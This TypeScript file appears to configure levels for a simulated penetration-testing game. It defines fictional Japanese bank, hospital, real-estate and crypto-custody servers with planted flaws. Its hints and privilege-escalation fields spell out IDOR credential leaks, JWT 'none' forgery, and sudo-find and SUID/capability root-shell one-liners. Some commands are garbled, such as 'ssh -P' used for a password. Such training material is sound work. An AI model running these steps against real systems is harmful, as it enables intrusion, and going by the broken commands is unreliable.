import { ServerConfig } from '../types/game';

export const EXTRA_CAMPAIGN_SERVERS: ServerConfig[] = [
  // =========================================================================
  // LEVEL 1B: UrbanEstates Real Estate Portal (Security Level 1/10)
  // =========================================================================
  {
    id: 'lvl-1b',
    level: 1,
    siteTemplate: 'realestate',
    siteBrand: {
      title: 'UrbanEstates 都市不動産ポータル',
      subtitle: '東京都心・プレミアムレジデンス物件検索システム',
    },
    name: 'Lv.1 UrbanEstates 不動産サイト',
    hostname: 'urban-estates',
    ip: '10.10.1.15',
    os: 'Ubuntu 22.04.3 LTS',
    kernel: 'Linux 5.15.0-88-generic x86_64',
    ttl: 64,
    macAddress: '00:50:56:8A:10:15',
    summary: '不動産検索サイトの公開バックアップディレクトリに管理者用メモとフラグが放置されている初級ターゲット。',
    objective: '10.10.1.15 のWebサービスまたは隠しディレクトリを調査し、フラグを取得してください。',
    toolsUsed: ['nmap', 'gobuster', 'curl'],
    hints: [
      '`gobuster dir -u http://10.10.1.15` または `ffuf -u http://10.10.1.15/FUZZ` で公開ディレクトリを調べましょう。',
      '`/backups` や `/robots.txt` に管理者用ディレクトリへのパスが記載されています。',
      '`curl http://10.10.1.15/backups/office_flag.txt` でフラグを取得できます。',
    ],
    flag: 'FLAG{urban_estates_public_backup_exposure}',
    firewall: {
      idsEnabled: false,
      blockAggressiveScans: false,
      rateLimitThreshold: 999,
      requireStealthOrTargeted: false,
    },
    services: [
      {
        id: 's1b-http',
        port: 80,
        protocol: 'tcp',
        type: 'http',
        name: 'http',
        version: 'nginx 1.22.1',
        state: 'open',
        banner: 'nginx/1.22.1',
        vulnerabilities: ['http_dir_listing', 'http_robots_leak'],
        webRoutes: [
          {
            path: '/',
            status: 200,
            contentType: 'text/html',
            body: `<html><head><title>UrbanEstates | 都市不動産</title></head><body><h1>UrbanEstates 物件検索ポータル</h1><p>港区・渋谷区・千代田区の最新賃貸・売買物件をご案内しています。</p></body></html>`,
          },
          {
            path: '/robots.txt',
            status: 200,
            contentType: 'text/plain',
            body: `User-agent: *\nDisallow: /backups/\nDisallow: /staff-portal/\n`,
          },
          {
            path: '/backups',
            status: 200,
            contentType: 'text/plain',
            body: `Index of /backups/\n../\nproperties_2025.csv\noffice_flag.txt\n`,
          },
          {
            path: '/backups/properties_2025.csv',
            status: 200,
            contentType: 'text/plain',
            body: `id,area,name,rent_jpy,status\n1,Minato-ku,Minami-Azabu Residence 804,385000,available\n2,Shibuya-ku,Shibuya Jinnan Park Tower 2201,520000,available\n3,Chiyoda-ku,Kojimachi Garden Court 502,295000,reserved\n`,
          },
          {
            path: '/backups/office_flag.txt',
            status: 200,
            contentType: 'text/plain',
            body: `FLAG{urban_estates_public_backup_exposure}\n`,
          },
        ],
      },
    ],
    users: [{ username: 'root', uid: 0, gid: 0, home: '/root', shell: '/bin/bash' }],
    files: [
      { path: '/root', content: '', owner: 'root', group: 'root', permissions: 'drwx------', isDirectory: true },
      {
        path: '/root/flag.txt',
        content: 'FLAG{urban_estates_public_backup_exposure}\n',
        owner: 'root',
        group: 'root',
        permissions: '-rw-------',
      },
    ],
    privescVectors: {},
  },

  // =========================================================================
  // LEVEL 4B: Aegis Medical Center (Security Level 4/10)
  // =========================================================================
  {
    id: 'lvl-4b',
    level: 4,
    siteTemplate: 'medical',
    siteBrand: {
      title: 'エイジス総合医療センター',
      subtitle: 'Aegis Medical Center — 患者予約・電子カルテ照会ポータル',
    },
    name: 'Lv.4 エイジス総合医療センター',
    hostname: 'aegis-med',
    ip: '10.10.1.35',
    os: 'Debian GNU/Linux 11',
    kernel: 'Linux 5.10.0-26-amd64 x86_64',
    ttl: 64,
    macAddress: '00:50:56:8A:10:35',
    summary: '医療ポータルの患者情報APIにおけるIDOR（認可不備）とLFI脆弱性を突き、スタッフ権限からSUIDでrootを奪取するターゲット。',
    objective: '患者照会APIまたはドキュメント閲覧機能の不備を突き、SSHログイン後に権限昇格してフラグを取得してください。',
    toolsUsed: ['nmap', 'curl', 'ssh', 'find'],
    hints: [
      'Webページの患者照会 (`/api/patient?id=101`) は認証チェックが不十分で、`id=1` や `id=0` を指定すると管理者レコードを取得できます。',
      '`/api/patient?id=1` に記載されたSSH認証情報 (`medadmin` / `summer2024`) で `ssh medadmin@10.10.1.35 -P summer2024` に接続できます。',
      'ログイン後 `find / -perm -4000 2>/dev/null` で `/usr/bin/python3` のSUIDを確認し、`python3 -c "import os; os.setuid(0)"` でroot化して `/root/flag.txt` を読み取ってください。',
    ],
    flag: 'FLAG{aegis_medical_idor_and_suid_escalation}',
    firewall: {
      idsEnabled: false,
      blockAggressiveScans: false,
      rateLimitThreshold: 999,
      requireStealthOrTargeted: false,
    },
    services: [
      {
        id: 's4b-ssh',
        port: 22,
        protocol: 'tcp',
        type: 'ssh',
        name: 'ssh',
        version: 'OpenSSH 8.4p1 Debian 5',
        state: 'open',
        banner: 'SSH-2.0-OpenSSH_8.4p1 Debian-5',
        vulnerabilities: ['ssh_weak_password'],
      },
      {
        id: 's4b-http',
        port: 80,
        protocol: 'tcp',
        type: 'http',
        name: 'http',
        version: 'nginx 1.18.0',
        state: 'open',
        banner: 'nginx/1.18.0',
        vulnerabilities: ['http_lfi'],
        webRoutes: [
          {
            path: '/',
            status: 200,
            contentType: 'text/html',
            body: `<html><head><title>Aegis Medical Center</title></head><body><h1>エイジス総合医療センター ポータル</h1><p>外来予約および検査結果の確認ができます。</p></body></html>`,
          },
          {
            path: '/api/patient',
            status: 200,
            contentType: 'application/json',
            body: `{"id":"101","name":"山田 太郎","department":"内科","next_visit":"2026-12-03","status":"予約確定"}`,
            idorConfig: {
              param: 'id',
              records: {
                '101': `{"id":"101","name":"山田 太郎","department":"内科","next_visit":"2026-12-03","status":"予約確定"}`,
                '102': `{"id":"102","name":"佐藤 花子","department":"眼科","next_visit":"2026-12-10","status":"検査待ち"}`,
                '1': `{"id":"1","role":"system_admin","ssh_user":"medadmin","ssh_pass":"summer2024","note":"Maintenance SSH enabled"}`,
                '0': `{"id":"0","role":"root_audit","alert":"Root flag stored in /root/flag.txt"}`,
              },
            },
          },
          {
            path: '/view',
            status: 200,
            contentType: 'text/plain',
            body: `外来案内パンフレット (2026年度版)`,
            lfiEnabled: true,
          },
        ],
      },
    ],
    users: [
      {
        username: 'medadmin',
        uid: 1001,
        gid: 1001,
        home: '/home/medadmin',
        shell: '/bin/bash',
        password: 'summer2024',
      },
      { username: 'root', uid: 0, gid: 0, home: '/root', shell: '/bin/bash' },
    ],
    files: [
      { path: '/home/medadmin', content: '', owner: 'medadmin', group: 'medadmin', permissions: 'drwxr-xr-x', isDirectory: true },
      {
        path: '/home/medadmin/shift.txt',
        content: 'Night maintenance window: 02:00 - 04:00 JST\n',
        owner: 'medadmin',
        group: 'medadmin',
        permissions: '-rw-r--r--',
      },
      {
        path: '/usr/bin/python3',
        content: '[ELF binary]',
        owner: 'root',
        group: 'root',
        permissions: '-rwsr-xr-x',
      },
      { path: '/root', content: '', owner: 'root', group: 'root', permissions: 'drwx------', isDirectory: true },
      {
        path: '/root/flag.txt',
        content: 'FLAG{aegis_medical_idor_and_suid_escalation}\n',
        owner: 'root',
        group: 'root',
        permissions: '-rw-------',
      },
    ],
    privescVectors: {
      suidBinaries: [
        {
          path: '/usr/bin/python3',
          exploitCmd: 'python3 -c "import os; os.setuid(0)"',
        },
      ],
    },
  },

  // =========================================================================
  // LEVEL 6B: Metropolitan Trust Bank (Security Level 6/10)
  // =========================================================================
  {
    id: 'lvl-6b',
    level: 6,
    siteTemplate: 'bank',
    siteBrand: {
      title: 'メトロポリタン信託銀行',
      subtitle: 'METROPOLITAN TRUST BANK — 法人・個人オンラインバンキング',
    },
    name: 'Lv.6 メトロポリタン信託銀行',
    hostname: 'metro-bank',
    ip: '10.10.1.65',
    os: 'Ubuntu 22.04.4 LTS',
    kernel: 'Linux 6.2.0-39-generic x86_64',
    ttl: 64,
    macAddress: '00:50:56:8A:10:65',
    summary: 'IDSが稼働する銀行オンラインポータル。口座APIのIDOR、隠された法人財務設定(.env)、およびsudo権限不備を連鎖させて金庫フラグを奪取せよ。',
    objective: 'IDSを回避しつつ銀行Webポータル・APIの認可不備から認証情報を奪取し、サーバー内部の /root/flag.txt を取得してください。',
    toolsUsed: ['nmap', 'curl', 'gobuster', 'ssh', 'sudo'],
    hints: [
      'IDSが有効なため `nmap -sS -T2 -sV -p 22,80,443 10.10.1.65` でスキャンしてください。',
      '銀行の口座照会API (`/api/account?id=1004`) で `id=1` を指定するか、`gobuster` で見つかる `/corp-treasury/.env` にSSH秘密鍵/パスワード情報 (`bankops` / `P@ssw0rd!`) があります。',
      '`ssh bankops@10.10.1.65 -P P@ssw0rd!` でログイン後、`sudo -l` で `/usr/bin/find` を悪用 (`sudo find . -exec /bin/sh \\;`) して `/root/flag.txt` を読み取ってください。',
    ],
    flag: 'FLAG{metro_bank_idor_treasury_vault_breach}',
    firewall: {
      idsEnabled: true,
      blockAggressiveScans: true,
      rateLimitThreshold: 6,
      requireStealthOrTargeted: true,
      decoyFilteredPorts: [21, 3306, 3389],
    },
    services: [
      {
        id: 's6b-ssh',
        port: 22,
        protocol: 'tcp',
        type: 'ssh',
        name: 'ssh',
        version: 'OpenSSH 8.9p1 Ubuntu 3ubuntu0.6',
        state: 'open',
        banner: 'SSH-2.0-OpenSSH_8.9p1',
        vulnerabilities: ['ssh_weak_password', 'ssh_key_auth'],
      },
      {
        id: 's6b-https',
        port: 443,
        protocol: 'tcp',
        type: 'https',
        name: 'https',
        version: 'nginx 1.24.0 (Bank TLS 1.3)',
        state: 'open',
        banner: 'Metropolitan-Bank-Gateway/4.2',
        vulnerabilities: ['http_env_leak', 'http_robots_leak'],
        webRoutes: [
          {
            path: '/',
            status: 200,
            contentType: 'text/html',
            body: `<html><head><title>メトロポリタン信託銀行 | オンラインバンキング</title></head><body><h1>メトロポリタン信託銀行</h1><p>預金残高照会・振込・法人トレジャリー管理</p></body></html>`,
          },
          {
            path: '/robots.txt',
            status: 200,
            contentType: 'text/plain',
            body: `User-agent: *\nDisallow: /corp-treasury/\nDisallow: /api/account\n`,
          },
          {
            path: '/corp-treasury/.env',
            status: 200,
            contentType: 'text/plain',
            body: `BANK_ENV=production\nTREASURY_SSH_USER=bankops\nTREASURY_SSH_PASS=P@ssw0rd!\nVAULT_NODE=10.10.1.65\n`,
          },
          {
            path: '/api/account',
            status: 200,
            contentType: 'application/json',
            body: `{"account_id":"1004","holder":"一般顧客口座 (デモ)","branch":"東京本店 (001)","balance_jpy":1482500,"tier":"Standard"}`,
            idorConfig: {
              param: 'id',
              records: {
                '1004': `{"account_id":"1004","holder":"一般顧客口座 (デモ)","branch":"東京本店 (001)","balance_jpy":1482500,"tier":"Standard"}`,
                '1005': `{"account_id":"1005","holder":"鈴木 健一","branch":"渋谷支店 (012)","balance_jpy":820400,"tier":"Standard"}`,
                '1': `{"account_id":"1","holder":"Treasury System Master","branch":"本店金庫管理","balance_jpy":98500000000,"ssh_user":"bankops","ssh_pass":"P@ssw0rd!","vault_path":"/root/flag.txt"}`,
              },
            },
          },
        ],
      },
    ],
    users: [
      {
        username: 'bankops',
        uid: 1002,
        gid: 1002,
        home: '/home/bankops',
        shell: '/bin/bash',
        password: 'P@ssw0rd!',
        sudoRules: ['(ALL) NOPASSWD: /usr/bin/find'],
      },
      { username: 'root', uid: 0, gid: 0, home: '/root', shell: '/bin/bash' },
    ],
    files: [
      { path: '/home/bankops', content: '', owner: 'bankops', group: 'bankops', permissions: 'drwxr-xr-x', isDirectory: true },
      {
        path: '/home/bankops/compliance.txt',
        content: 'Audit Note: Privileged vault scripts located in /root.\n',
        owner: 'bankops',
        group: 'bankops',
        permissions: '-rw-r--r--',
      },
      { path: '/root', content: '', owner: 'root', group: 'root', permissions: 'drwx------', isDirectory: true },
      {
        path: '/root/flag.txt',
        content: 'FLAG{metro_bank_idor_treasury_vault_breach}\n',
        owner: 'root',
        group: 'root',
        permissions: '-rw-------',
      },
    ],
    privescVectors: {
      sudoAbuse: [
        {
          binary: '/usr/bin/find',
          exploitCmd: 'sudo find . -exec /bin/sh \\;',
        },
      ],
    },
  },

  // =========================================================================
  // LEVEL 10B: Vortex Crypto Custody Exchange (Security Level 10/10)
  // =========================================================================
  {
    id: 'lvl-10b',
    level: 10,
    siteTemplate: 'exchange',
    siteBrand: {
      title: 'VORTEX Custody Exchange',
      subtitle: '機関投資家向けデジタル資産コールドウォレット・カストディ基盤',
    },
    name: 'Lv.10 Vortex 暗号資産カストディ',
    hostname: 'vortex-custody',
    ip: '10.10.10.20',
    os: 'Hardened Debian 12',
    kernel: 'Linux 6.1.0-20-hardened x86_64',
    ttl: 64,
    macAddress: '00:50:56:FF:10:20',
    summary: '厳格なIDS・DNS TXT暗号化ヒント・JWT改ざん・SSRF・Linux Capabilitiesを組み合わせた金融カストディ最高難度ターゲット。',
    objective: '複数の防衛機構を突破してカストディノードに侵入し、特権昇格でコールドウォレットのフラグを奪取してください。',
    toolsUsed: ['nmap', 'dig', 'base64', 'jwt-tool', 'curl', 'ssh', 'getcap'],
    hints: [
      'まず `nmap -sS -T2 -sV -p 22,53,443 10.10.10.20` と `dig @10.10.10.20 TXT custody.vortex.lab` でBase64文字列を取得し、`base64 -d` で隠しエンドポイント (`/api/v3/token`, `/api/v3/vault-key`) を特定します。',
      '`/api/v3/token` で取得したゲストJWTを `jwt-tool <JWT> --forge-none` で管理者JWTに偽造し、`curl -H "Authorization: Bearer <JWT>" https://10.10.10.20/api/v3/vault-key` で `custody` のSSH秘密鍵を取得してください。',
      '`ssh -i id_rsa custody@10.10.10.20` 接続後、`getcap -r / 2>/dev/null` で `/usr/bin/python3.11 = cap_setuid+ep` を確認し、`python3.11 -c "import os; os.setuid(0)"` でroot化して `/root/.coldwallet/flag.txt` を読み取ります。',
    ],
    flag: 'FLAG{vortex_custody_jwt_forge_cap_setuid}',
    firewall: {
      idsEnabled: true,
      blockAggressiveScans: true,
      rateLimitThreshold: 4,
      requireStealthOrTargeted: true,
      decoyFilteredPorts: [21, 80, 3306, 6379, 8080],
    },
    services: [
      {
        id: 's10b-dns',
        port: 53,
        protocol: 'tcp',
        type: 'dns',
        name: 'domain',
        version: 'ISC BIND 9.18.24',
        state: 'open',
        banner: 'BIND 9.18.24',
        vulnerabilities: ['dns_txt_secret'],
        dnsZoneTransfer: false,
        dnsRecords: [
          { type: 'A', name: 'vortex.lab', value: '10.10.10.20' },
          {
            type: 'TXT',
            name: 'custody.vortex.lab',
            // Base64 of "API_TOKEN=/api/v3/token | VAULT_KEY=/api/v3/vault-key"
            value: 'QVBJX1RPS0VOPS9hcGkvdjMvdG9rZW4gfCBWQVVMVF9LRVk9L2FwaS92My92YXVsdC1rZXk=',
          },
        ],
      },
      {
        id: 's10b-ssh',
        port: 22,
        protocol: 'tcp',
        type: 'ssh',
        name: 'ssh',
        version: 'OpenSSH 9.6p1 Hardened',
        state: 'open',
        banner: 'SSH-2.0-OpenSSH_9.6p1',
        vulnerabilities: ['ssh_key_auth'],
      },
      {
        id: 's10b-https',
        port: 443,
        protocol: 'tcp',
        type: 'https',
        name: 'https',
        version: 'nginx 1.25.4 (Zero-Trust WAF)',
        state: 'open',
        banner: 'Vortex-Edge/5.0',
        vulnerabilities: ['http_jwt_weak'],
        webRoutes: [
          {
            path: '/',
            status: 200,
            contentType: 'text/html',
            body: `<html><head><title>VORTEX Custody</title></head><body><h1>VORTEX Custody Exchange</h1><p>Institutional Cold Storage & Multi-Sig Settlement Platform.</p></body></html>`,
          },
          {
            path: '/api/v3/token',
            status: 200,
            contentType: 'application/json',
            body: `{"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYXVkaXRvcl9ndWVzdCIsInJvbGUiOiJndWVzdCJ9.sig_vortex99_guest"}`,
          },
          {
            path: '/api/v3/vault-key',
            status: 200,
            contentType: 'application/json',
            body: `{"user":"custody","private_key":"-----BEGIN OPENSSH PRIVATE KEY-----\\nVORTEX_CUSTODY_KEY_1020\\n-----END OPENSSH PRIVATE KEY-----"}`,
            requiresAuth: {
              type: 'bearer_jwt',
              secret: 'vortex99',
            },
          },
        ],
      },
    ],
    users: [
      {
        username: 'custody',
        uid: 1005,
        gid: 1005,
        home: '/home/custody',
        shell: '/bin/bash',
        sshAuthorizedKeys: ['VORTEX_CUSTODY_KEY_1020'],
      },
      { username: 'root', uid: 0, gid: 0, home: '/root', shell: '/bin/bash' },
    ],
    files: [
      { path: '/home/custody', content: '', owner: 'custody', group: 'custody', permissions: 'drwxr-xr-x', isDirectory: true },
      {
        path: '/usr/bin/python3.11',
        content: '[ELF binary]',
        owner: 'root',
        group: 'root',
        permissions: '-rwxr-xr-x',
      },
      { path: '/root', content: '', owner: 'root', group: 'root', permissions: 'drwx------', isDirectory: true },
      { path: '/root/.coldwallet', content: '', owner: 'root', group: 'root', permissions: 'drwx------', isDirectory: true },
      {
        path: '/root/.coldwallet/flag.txt',
        content: 'FLAG{vortex_custody_jwt_forge_cap_setuid}\n',
        owner: 'root',
        group: 'root',
        permissions: '-rw-------',
      },
    ],
    privescVectors: {
      capabilities: [
        {
          binary: '/usr/bin/python3.11',
          cap: 'cap_setuid+ep',
          exploitCmd: 'python3.11 -c "import os; os.setuid(0)"',
        },
      ],
    },
  },
];
